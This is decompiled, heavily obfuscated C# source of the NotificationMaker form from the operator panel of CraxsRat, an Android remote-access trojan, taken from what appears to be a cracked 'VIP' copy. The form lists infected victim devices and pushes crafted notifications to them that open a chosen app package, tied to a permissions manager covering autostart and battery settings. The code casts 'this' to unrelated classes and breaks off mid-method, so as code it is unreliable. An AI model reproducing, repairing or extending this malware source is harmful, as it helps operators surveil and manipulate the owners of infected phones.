// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.NotificationMaker
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class NotificationMaker : Form
  {
    private string split4;
    private string newhost;
    private string newport;
    private string newkey;
    private string newalive;
    private string newname;
    private string neweco;
    private string newconect;
    private string newsokt;
    private string newstrtconct;
    private string newcnl;
    private string newcnm;
    private string newsndmthd;
    private string newforuce;
    private string newplgs;
    private string NEWRANDOM;
    private string KeepScreen;
    private List<string> ALLPRIMSLIST;
    private int cou;
    public string TK;
    public bool need_write;
    public bool need_battery;
    public bool need_read;
    public bool need_forground;

    internal virtual DrakeUIAvatar DrakeUIAvatar1
    {
      get => ((ScreenReader) this)._DrakeUIAvatar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar1_Click);
label_1:
        int num1 = 2018916627;
        DrakeUIAvatar drakeUiAvatar1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~((num1 ^ -(-1335147447 - 273349567) - 2037310778 + (1764380939 * 584194328 + (19147265 - 1011994617) - -(1620308526 - 2057903133)) ^ ~((-128986425 * -1073742212 ^ -356054977 ^ 1007494223) - ~(1245587220 + 1674947875))) - 2139020774 * 1315465467) + --523975502 - 392382356)) % 7U)
          {
            case 0:
              drakeUiAvatar1.Click -= eventHandler;
              num1 = (int) num2 * 756912194 ^ 1241350557;
              continue;
            case 1:
              drakeUiAvatar1.Click += eventHandler;
              num1 = (int) num2 * -911179703 ^ -1241576067;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              int num3 = drakeUiAvatar1 == null ? 1459666752 : (num3 = 1383958160);
              num1 = num3 ^ (int) num2 * -932986747;
              continue;
            case 5:
              drakeUiAvatar1 = ((ScreenReader) this)._DrakeUIAvatar1;
              num1 = (int) num2 * 554317122 ^ -151903250;
              continue;
            case 6:
              ((ScreenReader) this)._DrakeUIAvatar1 = value;
              drakeUiAvatar1 = ((ScreenReader) this)._DrakeUIAvatar1;
              int num4;
              num1 = num4 = drakeUiAvatar1 == null ? 1125967561 : (num4 = -2087747167);
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((ScreenReader) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReader) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual DrakeUITextBox msgtext
    {
      get => ((ScreenReader) this)._msgtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReader) this)._msgtext = value;
    }

    internal virtual Label Label2
    {
      get => ((ScreenReader) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReader) this)._Label2 = value;
    }

    internal virtual Label Label1
    {
      get => ((ScreenReader) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReader) this)._Label1 = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar2
    {
      get => ((ScreenReader) this)._DrakeUIAvatar2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReader) this)._DrakeUIAvatar2 = value;
      }
    }

    internal virtual Label Label4
    {
      get => ((ScreenReader) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReader) this)._Label4 = value;
    }

    internal virtual DataGridView DGVC
    {
      get => ((ScreenReader._Closure\u0024__52\u002D0) this)._DGVC;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReader._Closure\u0024__52\u002D0) this)._DGVC = value;
      }
    }

    internal virtual DataGridViewCheckBoxColumn seleccli
    {
      get => ((ScreenReader._Closure\u0024__52\u002D0) this)._seleccli;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReader._Closure\u0024__52\u002D0) this)._seleccli = value;
      }
    }

    internal virtual DataGridViewImageColumn cliico
    {
      get => ((ScreenReader._Closure\u0024__52\u002D0) this)._cliico;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReader._Closure\u0024__52\u002D0) this)._cliico = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn cliename
    {
      get => ((ScreenReaderV2) this)._cliename;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._cliename = value;
    }

    internal virtual SplitContainer SplitContainer1
    {
      get => ((ScreenReaderV2) this)._SplitContainer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._SplitContainer1 = value;
      }
    }

    internal virtual Label Label3
    {
      get => ((ScreenReaderV2) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Label3 = value;
    }

    internal virtual Label Label35
    {
      get => ((ScreenReaderV2) this)._Label35;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label35_Click);
label_1:
        int num1 = -1195743480;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Label label35;
          switch ((num3 = (uint) ((-1443612078 - 1327553429 ^ 1878630305 - 790467728) - (~~num2 ^ 1796202331) ^ 1147153141 * 1232879333)) % 9U)
          {
            case 0:
              ((ScreenReaderV2) this)._Label35 = value;
              num1 = 1656277054;
              continue;
            case 1:
              label35.Click -= eventHandler;
              num1 = (int) num3 * -60056295 ^ -1913055619;
              continue;
            case 2:
              label35.Click += eventHandler;
              num1 = (int) num3 * 1649135497 ^ -922077156;
              continue;
            case 3:
              label35 = ((ScreenReaderV2) this)._Label35;
              num1 = (int) num3 * 1312932546 ^ -1010098945;
              continue;
            case 4:
              int num4 = label35 == null ? -2137391994 : (num4 = 1601632170);
              num1 = num4 ^ (int) num3 * 1868635;
              continue;
            case 5:
              label35 = ((ScreenReaderV2) this)._Label35;
              num1 = (int) num3 * -143449737 ^ 1443692534;
              continue;
            case 6:
              goto label_3;
            case 7:
              int num5 = label35 == null ? -465203785 : (num5 = -832524166);
              num1 = num5 ^ (int) num3 * -616576932;
              continue;
            case 8:
              goto label_1;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUITextBox toopentext
    {
      get => ((ScreenReaderV2) this)._toopentext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._toopentext = value;
      }
    }

    internal virtual Label TAlabel
    {
      get => ((ScreenReaderV2) this)._TAlabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._TAlabel = value;
    }

    internal virtual DrakeUIComboBox typecomp
    {
      get => ((ScreenReaderV2) this)._typecomp;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Actonscompo_SelectedIndexChanged);
        DrakeUIComboBox typecomp = ((ScreenReaderV2) this)._typecomp;
        if (typecomp == null)
          goto label_6;
label_1:
        int num1 = -708735692;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(~(-1950522233 * (1286213629 - -1074526255)) ^ (-892773707 * -692578656 + 598441202) * 320772945) - num2 + (2117858218 ^ -1564905613 * ~(528020135 * 561949307)) ^ -784841950 - 1348217722 + (238055031 + 555960307) + ~~2144638403)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              typecomp.SelectedIndexChanged -= eventHandler;
              num1 = (int) num3 * 1995461033 ^ 1376493478;
              continue;
            case 2:
              goto label_6;
            case 3:
              int num4 = typecomp == null ? -1651215809 : (num4 = -525521047);
              num1 = num4 ^ (int) num3 * 1982717382;
              continue;
            case 4:
              typecomp.SelectedIndexChanged += eventHandler;
              num1 = (int) num3 * -1772440118 ^ 1182016569;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((ScreenReaderV2) this)._typecomp = value;
        typecomp = ((ScreenReaderV2) this)._typecomp;
        num1 = -754827748;
        goto label_2;
      }
    }

    internal virtual DrakeUITextBox titletext
    {
      get => ((ScreenReaderV2) this)._titletext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._titletext = value;
      }
    }

    internal virtual DrakeUICheckBox checkusrcraxs
    {
      get => ((ScreenReaderV2) this)._checkusrcraxs;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._checkusrcraxs = value;
      }
    }

    public NotificationMaker(List<Client> L)
    {
      this.Load += new EventHandler(this.NotificationMaker_Load);
      ((ScreenReaderV2) this).listclients = new List<Client>();
      ((ScreenReaderV2) this).SelectedList = new List<Client>();
      ((ScreenReaderV2) this).type = EXGuarder.\u0037977254B;
      ((ScreenReaderV2) this).Openthis = EXGuarder.\u003781C3673;
      ((nonetform) this).InitializeComponent();
      ((ScreenReaderV2) this).listclients = L;
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 1557718418;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -((331218585 ^ -515182658) - 1874048794 - (~num2 + -(658233427 * ~(316456762 ^ -226817447)) ^ ~(1002698507 * -1695755575 - (-741559588 ^ -1799771150))) + -1443691913 * 1129683735)) % 10U)
        {
          case 0:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u00344363E04, EXGuarder.\u00326140152);
            num1 = (int) num3 * -1281063263 ^ -124448055;
            continue;
          case 1:
            int num4 = Operators.CompareString(language, EXGuarder.\u00376141C37, false) == 0 ? 487859232 : (num4 = -1120101763);
            num1 = num4 ^ (int) num3 * -44125585;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          case 4:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u00344363E04, EXGuarder.\u00331024C1A);
            num1 = -1751751727;
            continue;
          case 5:
            this.checkusrcraxs.Text = EXGuarder.\u00329496055;
            num1 = (int) num3 * 1719051958 ^ 906714638;
            continue;
          case 6:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u00344363E04, EXGuarder.\u00326140152);
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u00344363E04, EXGuarder.\u00326140152);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u00344363E04, EXGuarder.\u00326140152);
            num1 = (int) num3 * 491335028 ^ 1161003006;
            continue;
          case 7:
            int num5 = Operators.CompareString(language, EXGuarder.\u0037548176C, false) != 0 ? -978281863 : (num5 = -993335012);
            num1 = num5 ^ (int) num3 * -687705675;
            continue;
          case 8:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u00344363E04, EXGuarder.\u00331024C1A);
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u00344363E04, EXGuarder.\u00331024C1A);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u00344363E04, EXGuarder.\u00331024C1A);
            num1 = (int) num3 * -479925086 ^ -570502404;
            continue;
          case 9:
            this.checkusrcraxs.Text = EXGuarder.\u00323474075;
            num1 = (int) num3 * 285345391 ^ -1999053685;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:;
    }

    private void NotificationMaker_Load(object sender, EventArgs e)
    {
      List<Client>.Enumerator enumerator;
      if (((ScreenReaderV2) this).listclients.Count > 0)
      {
        try
        {
          enumerator = ((ScreenReaderV2) this).listclients.GetEnumerator();
label_2:
          int num1 = -200173665;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) ~-~num1) % 5U)
            {
              case 0:
                Client current = enumerator.Current;
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                this.DGVC.Rows[this.DGVC.Rows.Add((object) true, (object) ((Data._Closure\u0024__39\u002D17) current).Wallpaper, (object) ((Data._Closure\u0024__39\u002D12) current).ClientName)].Tag = (object) current;
                num1 = -1415365538;
                continue;
              case 1:
                int num3;
                num1 = num3 = enumerator.MoveNext() ? -1604290822 : (num3 = -2123135094);
                continue;
              case 3:
                num1 = (int) num2 * -314588674 ^ -1640034020;
                continue;
              case 4:
                goto label_2;
              default:
                goto label_8;
            }
          }
        }
        finally
        {
          enumerator.Dispose();
        }
      }
label_8:
      this.typecomp.Text = EXGuarder.\u00327273728;
    }

    private void Label35_Click(object sender, EventArgs e)
    {
      int num = (int) Interaction.MsgBox((object) EXGuarder.\u003002B0C41);
    }

    private void Actonscompo_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.typecomp.Text, EXGuarder.\u003112F6216, false) != 0)
        goto label_14;
label_1:
      int num1 = 682968124;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~((num1 * -391592067 - -694716637 * -((220062961 - 1662892640) * 1159870089)) * -1486323353) + 147133459)) % 23U)
        {
          case 0:
            this.toopentext.Watermark = EXGuarder.\u00372093A1B;
            this.TAlabel.Text = EXGuarder.\u003314D2C55;
            this.checkusrcraxs.Checked = true;
            num1 = (int) num2 * 1930776895 ^ -1390626642;
            continue;
          case 1:
            this.toopentext.Visible = false;
            this.toopentext.Text = EXGuarder.\u0034C536B08;
            num1 = (int) num2 * 346085010 ^ -1157813880;
            continue;
          case 2:
            goto label_14;
          case 3:
            goto label_3;
          case 4:
            this.checkusrcraxs.Visible = true;
            num1 = (int) num2 * -1872802530 ^ 1136984493;
            continue;
          case 5:
            this.TAlabel.Visible = true;
            this.toopentext.Enabled = true;
            this.toopentext.Visible = true;
            this.toopentext.Text = EXGuarder.\u0034C536B08;
            num1 = (int) num2 * -1709829936 ^ 1290118641;
            continue;
          case 6:
            this.checkusrcraxs.Enabled = false;
            num1 = (int) num2 * 1023285260 ^ 1053723419;
            continue;
          case 7:
            this.TAlabel.Text = EXGuarder.\u0032F411E1D;
            this.checkusrcraxs.Checked = false;
            this.checkusrcraxs.Enabled = false;
            num1 = (int) num2 * 1183079580 ^ 1802829483;
            continue;
          case 8:
            this.toopentext.Watermark = EXGuarder.\u00319604B17;
            num1 = (int) num2 * -553982654 ^ 246861095;
            continue;
          case 9:
            this.checkusrcraxs.Checked = false;
            num1 = (int) num2 * 1363318550 ^ -1534072090;
            continue;
          case 10:
            num1 = (int) num2 * -1087844853 ^ -1044163949;
            continue;
          case 11:
            this.TAlabel.Enabled = true;
            num1 = (int) num2 * -1704573172 ^ 1898218576;
            continue;
          case 12:
            this.checkusrcraxs.Visible = false;
            num1 = (int) num2 * 1976248100 ^ -726847571;
            continue;
          case 13:
            this.TAlabel.Enabled = false;
            this.TAlabel.Visible = false;
            num1 = (int) num2 * 953179191 ^ -657207379;
            continue;
          case 14:
            this.checkusrcraxs.Enabled = true;
            num1 = (int) num2 * 579658207 ^ -666773240;
            continue;
          case 15:
            this.toopentext.Text = EXGuarder.\u0034C536B08;
            num1 = (int) num2 * -1457758263 ^ 374343509;
            continue;
          case 16:
            this.toopentext.Visible = true;
            num1 = (int) num2 * -1737939296 ^ -1360299684;
            continue;
          case 17:
            int num3;
            num1 = num3 = Operators.CompareString(this.typecomp.Text, EXGuarder.\u0034E1D6A01, false) != 0 ? -1660027115 : (num3 = 953333633);
            continue;
          case 18:
            this.TAlabel.Text = EXGuarder.\u0034C536B08;
            num1 = (int) num2 * -1073662801 ^ -1328616949;
            continue;
          case 19:
            this.TAlabel.Enabled = true;
            this.TAlabel.Visible = true;
            this.toopentext.Enabled = true;
            num1 = (int) num2 * 1777408264 ^ 1807564014;
            continue;
          case 20:
            this.toopentext.Enabled = false;
            num1 = (int) num2 * 463154095 ^ -266212696;
            continue;
          case 21:
            goto label_1;
          case 22:
            this.checkusrcraxs.Visible = false;
            num1 = (int) num2 * 1039754355 ^ -1981408675;
            continue;
          default:
            goto label_25;
        }
      }
label_3:
      return;
label_25:
      return;
label_14:
      num1 = Operators.CompareString(this.typecomp.Text, EXGuarder.\u0031D671E2C, false) != 0 ? -306425978 : (num1 = 504171518);
      goto label_2;
    }

    private void DrakeUIAvatar1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.typecomp.Text, EXGuarder.\u00332785658, false) != 0)
        goto label_8;
label_1:
      int num1 = 1077873785;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(~-num1 * 432308143 ^ -1188085060 ^ -1287086683 - 1824910584) * -81100751)) % 13U)
        {
          case 0:
            int num3;
            num1 = num3 = Operators.CompareString(this.typecomp.Text, EXGuarder.\u00313480F27, false) != 0 ? 1085444721 : (num3 = 671705453);
            continue;
          case 1:
            ((ScreenReaderV2) this).type = EXGuarder.\u003170C1539;
            num1 = -1983832079;
            continue;
          case 2:
            goto label_23;
          case 3:
            ((ScreenReaderV2) this).Openthis = this.toopentext.Text;
            num1 = (int) num2 * 1687902119 ^ -956611731;
            continue;
          case 4:
            CraxsAlert.ShowWarning(EXGuarder.\u00361462864);
            num1 = (int) num2 * 822469356 ^ 711959039;
            continue;
          case 5:
            int num4 = Codes.IsValidPackageName(this.toopentext.Text) ? -324574969 : (num4 = 1174681240);
            num1 = num4 ^ (int) num2 * 218130075;
            continue;
          case 6:
            goto label_8;
          case 7:
            ((ScreenReaderV2) this).Openthis = EXGuarder.\u003094C4730;
            num1 = (int) num2 * -278645527 ^ -2072331503;
            continue;
          case 8:
            ((ScreenReaderV2) this).type = EXGuarder.\u0033A624D4E;
            num1 = (int) num2 * 280410614 ^ 397124887;
            continue;
          case 9:
            num1 = (int) num2 * 2105635665 ^ -1487541315;
            continue;
          case 11:
            goto label_1;
          case 12:
            ((ScreenReaderV2) this).type = EXGuarder.\u00371335138;
            ((ScreenReaderV2) this).Openthis = this.toopentext.Text;
            num1 = (int) num2 * 2080455163 ^ 339836175;
            continue;
          default:
            goto label_13;
        }
      }
label_23:
      return;
label_13:
      IEnumerator enumerator;
      if (this.DGVC.Rows.Count > 0)
      {
        try
        {
          enumerator = ((IEnumerable) this.DGVC.Rows).GetEnumerator();
label_15:
          uint num5;
          switch ((num5 = (uint) (~(~-874846916 * 432308143 ^ -1188085060 ^ -1287086683 - 1824910584) * -81100751)) % 3U)
          {
            case 1:
label_22:
              if (enumerator.MoveNext())
                goto default;
              else
                break;
            case 2:
              goto label_15;
            default:
              DataGridViewRow current = (DataGridViewRow) enumerator.Current;
              try
              {
                ((ScreenReaderV2) this).SelectedList.Add((Client) current.Tag);
                goto case 1;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
label_19:
                int num6 = -226945731;
                while (true)
                {
                  uint num7;
                  switch ((num7 = (uint) (~(~-num6 * 432308143 ^ -1188085060 ^ -1287086683 - 1824910584) * -81100751)) % 3U)
                  {
                    case 1:
                      ProjectData.ClearProjectError();
                      num6 = (int) num7 * 142003913 ^ 1005867354;
                      continue;
                    case 2:
                      goto label_19;
                    default:
                      goto label_22;
                  }
                }
              }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_25:
            int num8 = -413401118;
            while (true)
            {
              uint num9;
              switch ((num9 = (uint) (~(~-num8 * 432308143 ^ -1188085060 ^ -1287086683 - 1824910584) * -81100751)) % 3U)
              {
                case 0:
                  goto label_25;
                case 1:
                  (enumerator as IDisposable).Dispose();
                  num8 = (int) num9 * 725559545 ^ -1977649589;
                  continue;
                default:
                  goto label_28;
              }
            }
          }
label_28:;
        }
      }
      this.DialogResult = DialogResult.OK;
      this.Close();
      return;
label_8:
      num1 = Operators.CompareString(this.typecomp.Text, EXGuarder.\u0033C575E35, false) != 0 ? 1611917130 : (num1 = 1166175546);
      goto label_2;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -422175426;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -~~~((--311430115 ^ ~-1064688254 ^ -110680806 ^ 892807489 * ~(1136533614 + 1295643062)) - (num2 - (~~(-619833522 * -2081761597) + ~~(-748903675 ^ 1910756287) - -(-1538622943 * (~-1586851076 ^ -731754669 - 954163309)))))) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((ScreenReaderV2) this).components.Dispose();
              num1 = (int) num3 * -96793175 ^ -740288542;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num4 = ((ScreenReaderV2) this).components == null ? 2088671049 : (num4 = -1311412310);
              num1 = num4 ^ (int) num3 * -1193589450;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((ScreenReaderV2) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
      DataGridViewCellStyle gridViewCellStyle2 = new DataGridViewCellStyle();
label_1:
      int num1 = -248402497;
      DataGridViewCellStyle gridViewCellStyle3;
      DataGridViewCellStyle gridViewCellStyle4;
      DataGridViewCellStyle gridViewCellStyle5;
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(num1 * -1692511001 + -~(560583124 + -345418851 * -940222779)) - (2115804627 - 338355191) - -124238619)) % 290U)
        {
          case 0:
            ((PermissionsManager) this).Label4.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).Label4.ForeColor = Color.White;
            ((PermissionsManager) this).Label4.Location = new Point(493, 52);
            ((PermissionsManager) this).Label4.Margin = new Padding(2, 0, 2, 0);
            ((PermissionsManager) this).Label4.Name = EXGuarder.\u0032B011C74;
            num1 = (int) num2 * 1474422855 ^ 540954392;
            continue;
          case 1:
            ((ISupportInitialize) ((PermissionsManager) this).PictureBox2).EndInit();
            ((ISupportInitialize) ((PermissionsManager) this).PictureBox1).EndInit();
            num1 = (int) num2 * 2090947982 ^ 1720891769;
            continue;
          case 2:
            ((PermissionsManager) this).comboproms.Style = UIStyle.Green;
            num1 = (int) num2 * -13561015 ^ -1467788483;
            continue;
          case 3:
            ((ISupportInitialize) ((PermissionsManager) this).DGVPRIM).EndInit();
            num1 = (int) num2 * -1916587514 ^ -1273613531;
            continue;
          case 4:
            ((PermissionsManager) this).Label4.TabIndex = 11;
            num1 = (int) num2 * 969775485 ^ 1503654794;
            continue;
          case 5:
            ((PermissionsManager) this).Primslist.ItemSelectBackColor = Color.FromArgb(140, 140, 140);
            num1 = (int) num2 * 1443040030 ^ 1910990481;
            continue;
          case 6:
            ((PermissionsManager) this).Panel1.PerformLayout();
            num1 = (int) num2 * -2040483836 ^ -826241080;
            continue;
          case 7:
            gridViewCellStyle5.ForeColor = Color.White;
            num1 = (int) num2 * -1903745239 ^ 739960306;
            continue;
          case 8:
            ((PermissionsManager) this).Label6 = new Label();
            num1 = (int) num2 * -1348662419 ^ -59189116;
            continue;
          case 9:
            ((PermissionsManager) this).Label3.Text = EXGuarder.\u0036A552072;
            num1 = (int) num2 * -852688724 ^ -1157041895;
            continue;
          case 10:
            ((PermissionsManager) this).checkbattery.TabIndex = 15;
            num1 = (int) num2 * 1454259542 ^ 1262571495;
            continue;
          case 11:
            ((PermissionsManager) this).TabPage2.Controls.Add((Control) ((PermissionsManager) this).Button1);
            ((PermissionsManager) this).TabPage2.Controls.Add((Control) ((PermissionsManager) this).Button2);
            ((PermissionsManager) this).TabPage2.Controls.Add((Control) ((PermissionsManager) this).Primslist);
            ((PermissionsManager) this).TabPage2.Controls.Add((Control) ((PermissionsManager) this).addactiv);
            ((PermissionsManager) this).TabPage2.Controls.Add((Control) ((PermissionsManager) this).comboproms);
            num1 = (int) num2 * -76814502 ^ -677898258;
            continue;
          case 12:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -1523724390 ^ 1112490873;
            continue;
          case 13:
            ((PermissionsManager) this).Label1.TabIndex = 7;
            num1 = (int) num2 * 158366912 ^ 1207425614;
            continue;
          case 14:
            ((PermissionsManager) this).Label4.Text = EXGuarder.\u003272C2865;
            ((PermissionsManager) this).TextBox1.BackColor = Color.Black;
            ((PermissionsManager) this).TextBox1.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -265318068 ^ 155517342;
            continue;
          case 15:
            ((PermissionsManager) this).DrakeUITabControl1.TabSelectedColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * 1841441213 ^ 815966336;
            continue;
          case 16:
            ((PermissionsManager) this).TextBox1.Size = new Size(700, 65);
            ((PermissionsManager) this).TextBox1.TabIndex = 0;
            ((PermissionsManager) this).TextBox1.Text = EXGuarder.\u003133A794E;
            num1 = (int) num2 * -34093792 ^ 593137982;
            continue;
          case 17:
            ((PermissionsManager) this).Label6.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * -737021316 ^ -1304601608;
            continue;
          case 18:
            ((PermissionsManager) this).Label2.TabIndex = 9;
            num1 = (int) num2 * 1111843536 ^ -131433805;
            continue;
          case 19:
            ((PermissionsManager) this).Panel3.Name = EXGuarder.\u0031B17722F;
            num1 = (int) num2 * -1053646844 ^ 252940666;
            continue;
          case 20:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u0034B3B185D;
            num1 = (int) num2 * -2101312230 ^ 885011534;
            continue;
          case 21:
            this.AutoScaleDimensions = new SizeF(6f, 12f);
            num1 = (int) num2 * 1271567876 ^ 1333605727;
            continue;
          case 22:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Cursor = Cursors.Hand;
            num1 = (int) num2 * 588685627 ^ 300430074;
            continue;
          case 23:
            ((PermissionsManager) this).DrakeUITabControl1.FillColor = Color.Black;
            num1 = (int) num2 * 163883711 ^ -1434549080;
            continue;
          case 24:
            ((PermissionsManager) this).Button2.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).Button2.Name = EXGuarder.\u0031D2D5036;
            num1 = (int) num2 * 1003015152 ^ -1026999790;
            continue;
          case 25:
            ((PermissionsManager) this).checkbattery.Location = new Point(531, 26);
            num1 = (int) num2 * 866572926 ^ 173967162;
            continue;
          case 26:
            gridViewCellStyle4.BackColor = Color.Black;
            num1 = (int) num2 * 1530573629 ^ -738554285;
            continue;
          case 27:
            ((PermissionsManager) this).DGVPRIM.Size = new Size(700, 309);
            ((PermissionsManager) this).DGVPRIM.TabIndex = 0;
            num1 = (int) num2 * -1093943888 ^ 424242147;
            continue;
          case 28:
            ((PermissionsManager) this).Panel1.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -1050004886 ^ -976124701;
            continue;
          case 29:
            gridViewCellStyle2.BackColor = Color.Black;
            gridViewCellStyle2.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            gridViewCellStyle2.ForeColor = Color.White;
            num1 = (int) num2 * -1271878584 ^ 866481223;
            continue;
          case 30:
            ((PermissionsManager) this).Label3.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * 1474621046 ^ -895945045;
            continue;
          case 31:
            ((PermissionsManager) this).addactiv.Name = EXGuarder.\u0032D0A5B14;
            num1 = (int) num2 * -713142709 ^ 790919000;
            continue;
          case 32:
            ((PermissionsManager) this).DrakeUITabControl1.MenuStyle = UIMenuStyle.Custom;
            ((PermissionsManager) this).DrakeUITabControl1.Name = EXGuarder.\u003346D2442;
            ((PermissionsManager) this).DrakeUITabControl1.SelectedIndex = 0;
            num1 = (int) num2 * -456282320 ^ -1725116907;
            continue;
          case 33:
            ((PermissionsManager) this).Checkbg = new DrakeUICheckBox();
            ((PermissionsManager) this).checkautostart = new DrakeUICheckBox();
            num1 = (int) num2 * -674119806 ^ -577512435;
            continue;
          case 34:
            ((PermissionsManager) this).DGVPRIM.ShowRowErrors = false;
            num1 = (int) num2 * -973546222 ^ -124478947;
            continue;
          case 35:
            ((PermissionsManager) this).DGVPRIM.AllowUserToResizeColumns = false;
            num1 = (int) num2 * 378106969 ^ -988531636;
            continue;
          case 36:
            ((PermissionsManager) this).Panel3.Controls.Add((Control) ((PermissionsManager) this).clinameinfo);
            ((PermissionsManager) this).Panel3.Controls.Add((Control) ((PermissionsManager) this).ClientPic);
            ((PermissionsManager) this).Panel3.Dock = DockStyle.Top;
            num1 = (int) num2 * -1243296671 ^ 1620921483;
            continue;
          case 37:
            ((PermissionsManager) this).checkautostart.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).checkautostart.Location = new Point(70, 49);
            ((PermissionsManager) this).checkautostart.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).checkautostart.Name = EXGuarder.\u00329140B0E;
            num1 = (int) num2 * 172107089 ^ 1181033643;
            continue;
          case 38:
            ((PermissionsManager) this).PictureBox2.Size = new Size(184, 223);
            ((PermissionsManager) this).PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * 251857593 ^ 1953552271;
            continue;
          case 39:
            ((PermissionsManager) this).DrakeUIButtonIcon3.FillColor = Color.Black;
            num1 = (int) num2 * -1701930035 ^ -1962017367;
            continue;
          case 40:
            ((PermissionsManager) this).TabPage2.Controls.Add((Control) ((PermissionsManager) this).Panel1);
            ((PermissionsManager) this).TabPage2.Location = new Point(0, 40);
